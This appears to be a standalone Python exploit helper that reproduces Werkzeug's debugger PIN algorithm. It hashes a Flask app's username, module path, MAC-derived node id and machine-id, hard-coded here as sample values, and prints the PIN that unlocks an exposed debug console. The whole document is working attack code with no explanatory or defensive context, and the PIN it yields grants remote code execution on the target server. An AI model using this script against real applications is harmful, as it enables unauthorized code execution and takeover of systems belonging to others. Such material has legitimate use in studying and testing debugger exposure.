import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username running Flask app
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/dist-packages/flask/app.py'  # getattr(mod, '__file__', None)
]
private_bits = [
    '2485723358220',  # str(uuid.getnode()), e.g. MAC-derived node id
    '9c8d2a12-466d-4281-9d77-cf537a843e3a'  # machine-id (/etc/machine-id or /proc/sys/kernel/random/boot_id)
]
# Werkzeug >= 2.0 switched from md5 to sha1
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)